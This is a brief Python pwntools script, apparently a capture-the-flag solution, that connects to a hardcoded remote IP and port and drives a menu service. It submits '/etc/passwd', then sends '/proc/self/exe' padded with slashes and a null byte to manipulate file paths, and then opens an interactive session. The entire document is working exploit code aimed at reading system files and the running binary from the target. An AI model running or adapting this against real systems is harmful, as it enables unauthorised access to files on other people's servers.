from pwn import *
import sys
HOST = ""
PORT = 6677
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('54.180.100.218',PORT)
def put(dat):
  s.recvuntil(">")
  s.sendline("1")
  s.recvuntil(":")
  s.sendline(dat)
def merge(dat):
  s.recvuntil(">")
  s.sendline("2")
  s.recvuntil(":")
  s.sendline("/"*(32-len(dat))+dat+"\x00")
put("/etc/passwd")
merge("/proc/self/exe")
s.interactive()
